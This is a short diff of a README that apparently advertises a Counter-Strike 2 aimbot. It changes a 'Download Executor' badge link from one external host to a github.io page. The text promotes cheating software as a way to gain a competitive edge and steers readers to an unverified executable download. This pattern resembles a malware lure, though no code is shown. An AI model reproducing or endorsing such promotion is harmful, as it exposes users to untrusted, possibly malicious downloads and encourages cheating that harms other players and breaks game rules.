@@ -4,7 +4,7 @@
 
 Counter-Strike 2 (CS2) has revolutionized tactical shooters, offering intense gameplay and competitive dynamics. For players aiming to sharpen their skills and gain an edge, aimbots have emerged as a tool to enhance aiming precision and overall performance.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://Counter-Strike-2-Aimbot-xu1.github.io/.github)
 ---
 
 ## 🛠️ Product Description
